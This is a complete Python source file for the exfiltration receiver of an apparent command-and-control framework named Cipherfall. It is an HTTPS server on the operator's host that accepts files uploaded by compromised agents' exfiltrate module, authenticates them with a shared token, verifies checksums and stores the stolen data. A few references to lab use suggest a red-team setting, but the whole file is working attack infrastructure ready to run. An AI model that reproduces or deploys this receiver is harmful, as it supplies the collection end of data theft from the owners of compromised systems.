#!/usr/bin/env python3
"""
exfiltrate_receiver.py — Cipherfall C2 HTTPS exfiltration receiver

Receives files uploaded by the /module exfiltrate command from agents.
Runs as a standalone HTTPS server on the operator/C2 host.

Authentication:
  HMAC compare of X-Lab-Upload-Token header against a pre-shared token.

Integrity:
  SHA-256 of the received body is compared with the X-File-SHA256 header.
  Duplicate content (same SHA-256) is rejected even with a different name.
  Existing filenames are rejected to prevent accidental overwrites.

Usage:
  python3 exfiltrate_receiver.py --token 'long-random-token' --port 8443 \
      --output-dir /opt/operator_c2/received

TLS:
  Requires cert.pem + key.pem in the working directory, or paths passed via
  --cert / --key. A self-signed certificate is acceptable for lab use.
"""

import argparse
import hashlib
import hmac
import json
import os
import re
import ssl
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path


class UploadHandler(BaseHTTPRequestHandler):
    server_version = "CipherfallExfilReceiver/1.0"

    def log_message(self, fmt, *args):
        append_log(self.server, "%s - %s" % (self.address_string(), fmt % args))

    def do_POST(self):
        if self.path.rstrip("/") != "/receiver":
            self.send_error(HTTPStatus.NOT_FOUND, "Use POST /receiver/")
            return

        supplied_token = self.headers.get("X-Lab-Upload-Token", "")
        if not hmac.compare_digest(supplied_token, self.server.upload_token):
            self.send_error(HTTPStatus.UNAUTHORIZED, "Invalid upload token")
            return

        content_length = self.headers.get("Content-Length")
        if content_length is None:
            self.send_error(HTTPStatus.LENGTH_REQUIRED, "Content-Length is required")
            return
        try:
            length = int(content_length)
        except ValueError:
            self.send_error(HTTPStatus.BAD_REQUEST, "Invalid Content-Length")
            return
        if length < 1 or length > self.server.max_bytes:
            self.send_error(HTTPStatus.REQUEST_ENTITY_TOO_LARGE, "Upload exceeds configured limit")
            return

        content_type = self.headers.get("Content-Type", "")
        if not content_type.startswith("multipart/form-data"):
            self.send_error(HTTPStatus.UNSUPPORTED_MEDIA_TYPE, "Send multipart/form-data")
            return

        try:
            filename, payload = parse_file_part(self.rfile.read(length), content_type)
            if not filename or filename in {".", ".."}:
                raise ValueError("Invalid filename")
            self.server.output_dir.mkdir(parents=True, exist_ok=True)
            digest = hashlib.sha256(payload).hexdigest()
            claimed_checksum = self.headers.get("X-File-SHA256", "")
            if not hmac.compare_digest(digest, claimed_checksum):
                raise ValueError("SHA-256 checksum did not match")
            if find_duplicate(self.server.output_dir, digest):
                self.send_error(HTTPStatus.CONFLICT, "File content already exists")
                return
            destination = self.server.output_dir / filename
            if destination.exists():
                raise FileExistsError(filename)
            with destination.open("xb") as output:
                for start in range(0, len(payload), 64 * 1024):
                    chunk = payload[start : start + 64 * 1024]
                    output.write(chunk)
        except FileExistsError:
            self.send_error(HTTPStatus.CONFLICT, "File already exists")
            return
        except (KeyError, ValueError, OSError) as exc:
            self.send_error(HTTPStatus.BAD_REQUEST, str(exc))
            return

        append_log(self.server, "stored %s" % destination.name)
        self.send_response(HTTPStatus.CREATED)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write((json.dumps({"stored": destination.name}) + "\n").encode())


def find_duplicate(directory, expected_checksum):
    """Return True when an already received regular file has this SHA-256."""
    for candidate in directory.iterdir():
        if not candidate.is_file():
            continue
        digest = hashlib.sha256()
        with candidate.open("rb") as existing:
            while chunk := existing.read(64 * 1024):
                digest.update(chunk)
        if hmac.compare_digest(digest.hexdigest(), expected_checksum):
            return True
    return False


def append_log(server, message):
    """Append one line and recreate the log file if it was removed."""
    try:
        server.log_file.parent.mkdir(parents=True, exist_ok=True)
        with server.log_file.open("a", encoding="utf-8") as log:
            log.write(message + "\n")
    except OSError:
        print(message, flush=True)


def parse_file_part(body, content_type):
    """Read the single `file` multipart field emitted by the exfiltrate client."""
    match = re.search(r'(?:^|;)\s*boundary=(?:"([^"]+)"|([^;\s]+))', content_type, re.I)
    if not match:
        raise ValueError("Missing multipart boundary")
    boundary = (match.group(1) or match.group(2)).encode("ascii")
    separator = b"--" + boundary
    parts = body.split(separator)
    if len(parts) != 3 or not parts[0] == b"" or not parts[2].startswith(b"--"):
        raise ValueError("Malformed multipart body")

    part = parts[1]
    if not part.startswith(b"\r\n"):
        raise ValueError("Malformed multipart part")
    headers, marker, payload = part[2:].partition(b"\r\n\r\n")
    if not marker or not payload.endswith(b"\r\n"):
        raise ValueError("Malformed multipart file payload")
    disposition = next(
        (line.decode("latin-1") for line in headers.split(b"\r\n") if line.lower().startswith(b"content-disposition:")),
        "",
    )
    filename_match = re.search(r'(?:^|;)\s*filename="([^"]+)"', disposition, re.I)
    field_match = re.search(r'(?:^|;)\s*name="file"', disposition, re.I)
    if not filename_match or not field_match:
        raise ValueError("Expected one multipart field named file")
    filename = Path(filename_match.group(1).replace("\\", "/")).name
    return filename, payload[:-2]


def main():
    parser = argparse.ArgumentParser(description="Cipherfall C2 HTTPS exfiltration receiver.")
    parser.add_argument("--token", required=True, help="Shared upload token")
    parser.add_argument("--cert", default="cert.pem", help="TLS certificate path")
    parser.add_argument("--key", default="key.pem", help="TLS private-key path")
    parser.add_argument("--output-dir", default="received", help="Directory for received files")
    parser.add_argument("--log-file", default="exfil_receiver.log", help="Append-only receiver log path")
    parser.add_argument("--port", type=int, default=8443, help="HTTPS listening port")
    parser.add_argument("--max-mib", type=int, default=50, help="Maximum upload size in MiB")
    args = parser.parse_args()

    output_dir = Path(args.output_dir).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)
    httpd = ThreadingHTTPServer(("0.0.0.0", args.port), UploadHandler)
    httpd.upload_token = args.token
    httpd.output_dir = output_dir
    httpd.log_file = Path(args.log_file).resolve()
    httpd.max_bytes = args.max_mib * 1024 * 1024
    tls_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    tls_context.load_cert_chain(args.cert, args.key)
    httpd.socket = tls_context.wrap_socket(httpd.socket, server_side=True)
    append_log(httpd, "exfil receiver listening on HTTPS port %d; output: %s" % (args.port, output_dir))
    httpd.serve_forever()


if __name__ == "__main__":
    main()
